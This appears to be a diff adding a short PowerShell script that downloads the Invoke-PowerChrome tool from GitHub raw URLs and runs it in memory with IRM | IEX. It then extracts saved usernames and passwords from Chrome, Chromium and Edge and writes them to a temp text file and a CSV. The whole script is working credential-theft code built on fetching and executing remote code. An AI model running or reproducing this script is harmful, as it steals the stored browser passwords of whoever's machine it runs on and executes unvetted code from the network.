@@ -1,0 +1,19 @@
+IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX
+
+# 자격 증명 추출 후 txt 파일로 저장
+Invoke-PowerChrome -Browser Chrome | Out-File -FilePath "$env:TEMP\chrome_creds.txt" -Encoding UTF8
+Invoke-PowerChrome -Browser Chromium | Out-File -FilePath "$env:TEMP\chrome_creds.txt" -Encoding UTF8
+Invoke-PowerChrome -Browser Edge | Out-File -FilePath "$env:TEMP\chrome_creds.txt" -Encoding UTF8
+
+# Hide Banner
+Invoke-PowerChrome -Browser Chrome -HideBanner
+
+# Verbose
+Invoke-PowerChrome -Browser Chrome -Verbose
+
+IRM 'https://raw.githubusercontent.com/zjdev716/Test/refs/heads/main/Invoke-PowerChrome.ps1' | IEX
+
+$results = Invoke-PowerChrome -Browser Chrome -Verbose
+$results | Where-Object { $_ -is [PSCustomObject] -and $_.Password } | 
+    Select-Object Browser, Profile, Target, Username, Password | 
+    Export-Csv -Path "D:\Project\Nirsoft\Invoke-PowerChrome\chrome_passwords.csv" -NoTypeInformation -Encoding UTF8
